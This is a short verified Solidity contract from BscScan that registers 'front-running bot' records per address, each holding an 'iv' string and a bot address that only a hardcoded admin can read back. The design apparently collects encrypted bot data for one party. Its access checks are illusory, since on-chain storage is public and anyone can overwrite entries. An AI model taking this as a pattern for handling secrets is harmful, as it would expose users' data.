/**
 *Submitted for verification at BscScan.com on 2021-12-04
*/

pragma solidity ^0.4.18;

contract Borange {
    
    struct FrontBot {
        string iv;
        string botAddr;
    }
    
    mapping (address => FrontBot) bots;
    address[] public botAccts;
    
    address public admin = 0x3B0F531c469758185D7263B4A12C63c71b0846eC;
    
    modifier isAdmin(){
        if(msg.sender != admin)
            return;
        _;
    }
    
    function setFrontBot(address _address, string _iv, string _botAddr) public {
        var bot = bots[_address];
        
        bot.iv = _iv;
        bot.botAddr = _botAddr;

        botAccts.push(_address) -1;
    }
    
    function getFrontBots() view public returns(address[]) {
        return botAccts;
    }
    
    function getFrontBotAddr(address _address) view isAdmin public returns (string) {
        return (bots[_address].botAddr);
    }
    
    function getFrontBotIv(address _address) view isAdmin public returns (string) {
        return (bots[_address].iv);
    }

    function countFrontBots() view public returns (uint) {
        return botAccts.length;
    }
}